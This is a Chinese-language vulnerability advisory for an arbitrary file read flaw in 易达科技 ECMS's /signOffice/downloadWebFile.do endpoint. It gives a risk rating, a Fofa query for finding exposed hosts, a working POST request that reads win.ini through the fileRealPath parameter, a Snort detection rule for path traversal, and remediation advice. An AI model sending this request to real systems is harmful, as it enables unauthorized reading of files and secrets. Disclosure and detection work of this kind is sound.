# 易达科技ECMS downloadWebFile.do存在任意文件读取漏洞

易达科技ECMS downloadWebFile.do存在任意文件读取漏洞

# 影响版本

**易达科技ECMS至今全版本**

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa:**  **app=&quot;易达科技-ECMS&quot;**

**POC/EXP：**

**step1 读取win.ini文件**

```
POST /signOffice/downloadWebFile.do HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

fileRealPath=c:\windows\win.ini
```

​![image](assets/image-20260822175835-kjfg1dh.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"易达科技ECMS - /signOffice/downloadWebFile.do 任意文件读取漏洞 (Path Traversal/File Read)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/signOffice/downloadWebFile.do"; fast_pattern;
    http.content_type; content:"application/x-www-form-urlencoded";
    http.request_body; content:"fileRealPath="; nocase;
    http.request_body; pcre:"/fileRealPath\s*=\s*[^&]*?(?:\.\.\/|\.\.\\|c:|\/etc\/)/i";
    metadata:
        service http,
        affected_product "易达科技ECMS",
        vulnerability_type "Arbitrary File Read",
        severity "high";
    classtype:web-application-attack;
    sid:1000730;
    rev:1;
    priority:2;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。

‍
